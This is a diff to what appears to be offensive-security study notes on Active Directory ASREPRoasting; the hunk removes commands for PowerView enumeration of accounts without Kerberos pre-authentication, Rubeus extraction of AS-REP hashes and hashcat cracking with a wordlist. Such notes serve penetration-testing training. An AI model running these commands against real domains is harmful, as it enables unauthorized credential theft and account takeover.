@@ -381,30 +381,6 @@ It's possible to obtain the Ticket Granting Ticket (TGT) for any account that ha
 
 ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.
 
-#### DONT_REQ_PREAUTH Value using Get-DomainUser
-
-Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
-
-```powershell
-Import-Module .\PowerView.ps1
-Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
-```
-
-With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.
-
-```powershell
-# Retrieving AS-REP in Proper Format using Rubeus
-.\Rubeus.exe asreproast /user:$user /nowrap /format:hashcat
-# Example:
-# .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
-```
-
-Cracking the Hash Offline with Hashcat:
-
-```bash
-hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
-```
-
 #### DONT_REQ_PREAUTH Value using kerbrute
 
 ```shell-session
